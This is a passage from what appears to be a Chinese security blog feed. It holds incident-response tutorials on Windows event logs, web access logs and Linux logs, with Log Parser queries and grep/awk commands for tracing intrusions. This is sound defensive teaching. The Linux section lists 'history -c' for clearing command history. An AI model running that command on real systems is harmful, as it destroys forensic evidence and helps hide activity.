      <link href="/2019/10/16/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindow%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2019/10/16/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindow%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第1篇-Window日志分析"><a href="#第1篇-Window日志分析" class="headerlink" title="第1篇:Window日志分析"></a>第1篇:Window日志分析</h2><h3 id="0x01-Window事件日志简介"><a href="#0x01-Window事件日志简介" class="headerlink" title="0x01 Window事件日志简介"></a>0x01 Window事件日志简介</h3><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p><p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p><p><strong>系统日志</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。</span><br><span class="line"></span><br><span class="line">默认位置： %SystemRoot%\System32\Winevt\Logs\System.evtx</span><br></pre></td></tr></table></figure><p><strong>应用程序日志</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 </span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br></pre></td></tr></table></figure><p><strong>安全日志</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure><p>​    系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。 </p><h3 id="0X02-审核策略与事件查看器"><a href="#0X02-审核策略与事件查看器" class="headerlink" title="0X02 审核策略与事件查看器"></a>0X02 审核策略与事件查看器</h3><p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>PS：默认状态下，也会记录一些简单的日志，日志默认大小20M</p><p><strong>设置1</strong>：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：</p><p><img src="/images/log-1-1.png" alt></p><p><strong>设置2</strong>：设置合理的日志属性，即日志最大大小、事件覆盖阀值等： </p><p><img src="/images/log-1-2.png" alt></p><p><strong>查看系统日志方法：</strong></p><ol><li><p>在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong></p></li><li><p>按 “<strong>Window+R</strong>“，输入 ”<strong>eventvwr.msc</strong>“ 也可以直接进入“<strong>事件查看器</strong>” </p><p><img src="/images/log-1-3.png" alt></p></li></ol><h3 id="0x03-事件日志分析"><a href="#0x03-事件日志分析" class="headerlink" title="0x03 事件日志分析"></a>0x03 事件日志分析</h3><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p><table><thead><tr><th align="left">事件ID</th><th>说明</th></tr></thead><tbody><tr><td align="left">4624</td><td>登录成功</td></tr><tr><td align="left">4625</td><td>登录失败</td></tr><tr><td align="left">4634</td><td>注销成功</td></tr><tr><td align="left">4647</td><td>用户启动的注销</td></tr><tr><td align="left">4672</td><td>使用超级用户（如管理员）进行登录</td></tr><tr><td align="left">4720</td><td>创建用户</td></tr></tbody></table><p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p><table><thead><tr><th align="left">登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td align="left">2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录。</td></tr><tr><td align="left">3</td><td>网络（Network）</td><td>最常见的情况就是连接到共享文件夹或共享打印机时。</td></tr><tr><td align="left">4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动。</td></tr><tr><td align="left">5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行。</td></tr><tr><td align="left">7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td align="left">8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如FTP。</td></tr><tr><td align="left">9</td><td>新凭证（NewCredentials）</td><td>使用带/Netonly参数的RUNAS命令运行一个程序。</td></tr><tr><td align="left">10</td><td>远程交互，（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机。</td></tr><tr><td align="left">11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table><p>关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。</p><blockquote><p>原文链接 ：<a href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008" target="_blank" rel="noopener">https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</a></p></blockquote><p>案例1：可以利用eventlog事件来查看系统账号登录情况：</p><ol><li><p>在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p></li><li><p>在事件查看器中，单击<strong>“安全”</strong>，查看安全日志；</p></li><li><p>在安全日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p><p>4624  –登录成功<br>4625  –登录失败<br>4634 – 注销成功<br>4647 – 用户启动的注销<br>4672 – 使用超级用户（如管理员）进行登录</p></li></ol><p>我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。</p><p><img src="/images/log-1-4.png" alt></p><p>案例2：可以利用eventlog事件来查看计算机开关机的记录： </p><p>1、在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p><p>2、在事件查看器中，单击<strong>“系统”</strong>，查看系统日志；</p><p>3、在系统日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p><p>其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。<br>    6005 信息 EventLog 事件日志服务已启动。(开机)<br>    6006 信息 EventLog 事件日志服务已停止。(关机)<br>    6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机</p><p>我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。</p><p><img src="/images/log-1-5.png" alt></p><h3 id="0x04-日志分析工具"><a href="#0x04-日志分析工具" class="headerlink" title="0x04 日志分析工具"></a>0x04 日志分析工具</h3><h4 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h4><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p><p>Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p>Log Parser 使用示例：<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/" target="_blank" rel="noopener">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></p><p><img src="/images/log-1-6.png" alt></p><p><strong>基本查询结构</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Logparser.exe –i:EVT –o:DATAGRID &quot;SELECT * FROM c:\xx.evtx&quot;</span><br></pre></td></tr></table></figure><p><strong>使用Log Parser分析日志</strong></p><p>1、查询登录成功的事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">指定登录时间范围的事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where TimeGenerated&gt;&apos;2018-06-19 23:32:11&apos; and TimeGenerated&lt;&apos;2018-06-20 23:34:00&apos; and EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">提取登录成功的用户名和IP：</span><br><span class="line">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&apos; &apos;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&apos;|&apos;) as Username,EXTRACT_TOKEN(Message,38,&apos; &apos;) as Loginip FROM c:\Security.evtx where EventID=4624&quot;</span><br></pre></td></tr></table></figure><p> 2、查询登录失败的事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">登录失败的所有事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4625&quot;</span><br><span class="line"></span><br><span class="line">提取登录失败用户名进行聚合统计：</span><br><span class="line">LogParser.exe  -i:EVT &quot;SELECT  EXTRACT_TOKEN(Message,13,&apos; &apos;)  as EventType,EXTRACT_TOKEN(Message,19,&apos; &apos;) as user,count(EXTRACT_TOKEN(Message,19,&apos; &apos;)) as Times,EXTRACT_TOKEN(Message,39,&apos; &apos;) as Loginip FROM c:\Security.evtx where EventID=4625 GROUP BY Message&quot;</span><br></pre></td></tr></table></figure><p>3、系统历史开关机记录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006&quot;</span><br></pre></td></tr></table></figure><h4 id="LogParser-Lizard"><a href="#LogParser-Lizard" class="headerlink" title="LogParser Lizard"></a>LogParser Lizard</h4><p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p><p>下载地址：<a href="http://www.lizard-labs.com/log_parser_lizard.aspx" target="_blank" rel="noopener">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p><p>依赖包：Microsoft .NET Framework 4 .5，下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p><p>查询最近用户登录情况：</p><p><img src="/images/log-1-7.png" alt></p><h4 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a>Event Log Explorer</h4><p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p><p>下载地址：<a href="https://event-log-explorer.en.softonic.com/" target="_blank" rel="noopener">https://event-log-explorer.en.softonic.com/</a></p><p><img src="/images/log-1-8.png" alt></p><p>参考链接：</p><p>Windows日志分析   <a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a></p>]]></content>
      
      
      <categories>
          
          <category> 日志分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第二章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第2章第3篇:Web日志分析</title>
      <link href="/2019/10/16/%E7%AC%AC3%E7%AF%87%EF%BC%9AWeb%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2019/10/16/%E7%AC%AC3%E7%AF%87%EF%BC%9AWeb%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第3篇-Web日志分析"><a href="#第3篇-Web日志分析" class="headerlink" title="第3篇:Web日志分析"></a>第3篇:Web日志分析</h2><h3 id="ox01-Web日志"><a href="#ox01-Web日志" class="headerlink" title="ox01  Web日志"></a>ox01  Web日志</h3><p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p><p>我们来看一条Apache的访问日志：</p><p><code>127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] &quot;GET /login.html HTTP/1.1&quot; 200 786 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36&quot;</code></p><p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p><p>本文通过介绍Web日志安全分析时的思路和常用的一些技巧。</p><h3 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h3><p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p><p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p><p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p><p>常用分析工具：</p><p>Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p><p>Linux下，使用Shell命令组合查询分析。</p><p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p><p>Apache日志分析技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、列出当天访问次数最多的IP命令：</span><br><span class="line">cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class="line"></span><br><span class="line">2、查看当天有多少个IP访问：</span><br><span class="line">awk &apos;&#123;print $1&#125;&apos; log_file|sort|uniq|wc -l</span><br><span class="line"></span><br><span class="line">3、查看某一个页面被访问的次数：</span><br><span class="line">grep &quot;/index.php&quot; log_file | wc -l</span><br><span class="line"></span><br><span class="line">4、查看每一个IP访问了多少个页面：</span><br><span class="line">awk &apos;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&apos; log_file</span><br><span class="line"></span><br><span class="line">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class="line">awk &apos;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&apos; log_file | sort -n</span><br><span class="line"></span><br><span class="line">6、查看某一个IP访问了哪些页面：</span><br><span class="line">grep ^111.111.111.111 log_file| awk &apos;&#123;print $1,$7&#125;&apos;</span><br><span class="line"></span><br><span class="line">7、去掉搜索引擎统计当天的页面：</span><br><span class="line">awk &apos;&#123;print $12,$1&#125;&apos; log_file | grep ^\&quot;Mozilla | awk &apos;&#123;print $2&#125;&apos; |sort | uniq | wc -l</span><br><span class="line"></span><br><span class="line">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class="line">awk &apos;&#123;print $4,$1&#125;&apos; log_file | grep 21/Jun/2018:14 | awk &apos;&#123;print $2&#125;&apos;| sort | uniq | wc -l</span><br></pre></td></tr></table></figure><h3 id="0x03-日志分析案例"><a href="#0x03-日志分析案例" class="headerlink" title="0x03 日志分析案例"></a>0x03 日志分析案例</h3><p>Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。</p><p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p><p>这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。</p><p>1、定位攻击源</p><p>首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。</p><p><img src="/images/log-3-1.png" alt></p><p>浏览器指纹：</p><p><code>Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)</code></p><p>2、搜索相关日志记录</p><p>通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。</p><p><img src="/images/log-3-2.png" alt></p><p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A、攻击者访问首页和登录页</span><br><span class="line">B、攻击者访问MsgSjlb.aspx和MsgSebd.aspx</span><br><span class="line">C、攻击者访问Xzuser.aspx</span><br><span class="line">D、攻击者多次POST（怀疑通过这个页面上传模块缺陷）</span><br><span class="line">E、攻击者访问了图片木马</span><br></pre></td></tr></table></figure><p>打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。</p><h3 id="0x04-日志统计分析技巧"><a href="#0x04-日志统计分析技巧" class="headerlink" title="0x04 日志统计分析技巧"></a>0x04 日志统计分析技巧</h3><p>统计爬虫：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">'Googlebot|Baiduspider'</span>  /www/logs/access<span class="number">.2019</span><span class="number">-02</span><span class="number">-23.</span>log | awk <span class="string">'&#123; print $1 &#125;'</span> | sort | uniq</span><br></pre></td></tr></table></figure><p>统计浏览器：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span><span class="number">-02</span><span class="number">-23.</span>log | grep -v -E <span class="string">'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon'</span> | sort | uniq -c | sort -r -n | head -n <span class="number">100</span></span><br></pre></td></tr></table></figure><p>IP 统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">'23/May/2019'</span> /www/logs/access<span class="number">.2019</span><span class="number">-02</span><span class="number">-23.</span>log | awk <span class="string">'&#123;print $1&#125;'</span> | awk -F<span class="string">'.'</span> <span class="string">'&#123;print $1"."$2"."$3"."$4&#125;'</span> | sort | uniq -c | sort -r -n | head -n <span class="number">10</span></span><br><span class="line">   <span class="number">2206</span> <span class="number">219.136</span><span class="number">.134</span><span class="number">.13</span></span><br><span class="line">   <span class="number">1497</span> <span class="number">182.34</span><span class="number">.15</span><span class="number">.248</span></span><br><span class="line">   <span class="number">1431</span> <span class="number">211.140</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">   <span class="number">1431</span> <span class="number">119.145</span><span class="number">.149</span><span class="number">.106</span></span><br><span class="line">   <span class="number">1427</span> <span class="number">61.183</span><span class="number">.15</span><span class="number">.179</span></span><br><span class="line">   <span class="number">1427</span> <span class="number">218.6</span><span class="number">.8</span><span class="number">.189</span></span><br><span class="line">   <span class="number">1422</span> <span class="number">124.232</span><span class="number">.150</span><span class="number">.171</span></span><br><span class="line">   <span class="number">1421</span> <span class="number">106.187</span><span class="number">.47</span><span class="number">.224</span></span><br><span class="line">   <span class="number">1420</span> <span class="number">61.160</span><span class="number">.220</span><span class="number">.252</span></span><br><span class="line">   <span class="number">1418</span> <span class="number">114.80</span><span class="number">.201</span><span class="number">.18</span></span><br></pre></td></tr></table></figure><p>统计网段：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span><span class="number">-02</span><span class="number">-23.</span>log | awk <span class="string">'&#123;print $1&#125;'</span> | awk -F<span class="string">'.'</span> <span class="string">'&#123;print $1"."$2"."$3".0"&#125;'</span> | sort | uniq -c | sort -r -n | head -n <span class="number">200</span></span><br></pre></td></tr></table></figure><p>统计域名：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span><span class="number">-02</span><span class="number">-23.</span>log |awk <span class="string">'&#123;print $2&#125;'</span>|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>HTTP Status：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span><span class="number">-02</span><span class="number">-23.</span>log |awk <span class="string">'&#123;print $9&#125;'</span>|sort|uniq -c|sort -rn|more</span><br><span class="line"><span class="number">5056585</span> <span class="number">304</span></span><br><span class="line"><span class="number">1125579</span> <span class="number">200</span></span><br><span class="line">   <span class="number">7602</span> <span class="number">400</span></span><br><span class="line">      <span class="number">5</span> <span class="number">301</span></span><br></pre></td></tr></table></figure><p>URL 统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span><span class="number">-02</span><span class="number">-23.</span>log |awk <span class="string">'&#123;print $7&#125;'</span>|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>文件流量统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span><span class="number">-02</span><span class="number">-23.</span>log |awk <span class="string">'&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;'</span>|sort -rn|more</span><br><span class="line"></span><br><span class="line">grep <span class="string">' 200 '</span> /www/logs/access<span class="number">.2019</span><span class="number">-02</span><span class="number">-23.</span>log |awk <span class="string">'&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;'</span>|sort -rn|more</span><br></pre></td></tr></table></figure><p>URL访问量统计：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span><span class="number">-02</span><span class="number">-23.</span>log | awk <span class="string">'&#123;print $7&#125;'</span> | egrep <span class="string">'\?|&amp;'</span> | sort | uniq -c | sort -rn | more</span><br></pre></td></tr></table></figure><p>脚本运行速度：</p><p>查出运行速度最慢的脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v <span class="number">0</span>$ /www/logs/access<span class="number">.2019</span><span class="number">-02</span><span class="number">-23.</span>log | awk -F <span class="string">'\" '</span> <span class="string">'&#123;print $4" " $1&#125;'</span> web.log | awk <span class="string">'&#123;print $1" "$8&#125;'</span> | sort -n -k <span class="number">1</span> -r | uniq &gt; <span class="regexp">/tmp/</span>slow_url.txt</span><br></pre></td></tr></table></figure><p>IP, URL 抽取：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># tail -f /www/logs/access.2019-02-23.log | grep '/test.html' | awk '&#123;print $1" "$7&#125;'</span><br></pre></td></tr></table></figure><p> 参考链接：</p><blockquote><p><a href="https://www.jb51.net/article/53954.htm" target="_blank" rel="noopener">https://www.jb51.net/article/53954.htm</a></p><p><a href="https://www.jb51.net/article/58017.htm" target="_blank" rel="noopener">https://www.jb51.net/article/58017.htm</a></p><p><a href="https://cloud.tencent.com/developer/article/1051427" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1051427</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 日志分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第二章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第2章第2篇:Linux日志分析</title>
      <link href="/2019/10/16/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2019/10/16/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="第2篇-Linux日志分析"><a href="#第2篇-Linux日志分析" class="headerlink" title="第2篇:Linux日志分析"></a>第2篇:Linux日志分析</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。</p><h3 id="0x01-日志简介"><a href="#0x01-日志简介" class="headerlink" title="0x01 日志简介"></a>0x01 日志简介</h3><p>日志默认存放位置：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><table><thead><tr><th align="center">日志文件</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">/var/log/cron</td><td align="center">记录了系统定时任务相关的日志</td></tr><tr><td align="center">/var/log/cups</td><td align="center">记录打印信息的日志</td></tr><tr><td align="center">/var/log/dmesg</td><td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td align="center">/var/log/mailog</td><td align="center">记录邮件信息</td></tr><tr><td align="center">/var/log/message</td><td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td align="center">/var/log/lastlog</td><td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td></tr><tr><td align="center">/var/log/utmp</td><td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td></tr><tr><td align="center">/var/log/secure</td><td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>比较重要的几个日志：<br>    登录失败记录：/var/log/btmp     //lastb<br>    最后一次登录：/var/log/lastlog  //lastlog<br>    登录成功记录: /var/log/wtmp     //last<br>    登录日志记录：/var/log/secure   </p><p>​    目前登录用户信息：/var/run/utmp  //w、who、users</p><p>​    历史命令记录：history<br>​    仅清理当前用户： history -c</p><h3 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h3><h4 id="A、常用的shell命令"><a href="#A、常用的shell命令" class="headerlink" 